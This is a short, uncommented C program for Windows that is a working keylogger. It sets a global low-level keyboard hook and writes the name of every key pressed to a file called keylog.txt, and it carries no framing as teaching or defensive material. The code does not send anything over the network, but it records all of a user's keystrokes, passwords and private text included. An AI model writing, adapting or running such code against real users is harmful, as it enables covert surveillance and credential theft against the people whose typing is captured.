#include <windows.h>
#include <winuser.h>
#include <stdio.h>

HHOOK hook;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
            DWORD vkCode = kbdStruct->vkCode;

            FILE* logFile = fopen("keylog.txt", "a");
            if (logFile != NULL) {
                char key[16];
                GetKeyNameText(vkCode << 16, key, sizeof(key));
                fprintf(logFile, "%s\n", key);
                fclose(logFile);
            }
        }
    }

    return CallNextHookEx(hook, nCode, wParam, lParam);
}

int main() {
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
    return 0;
}
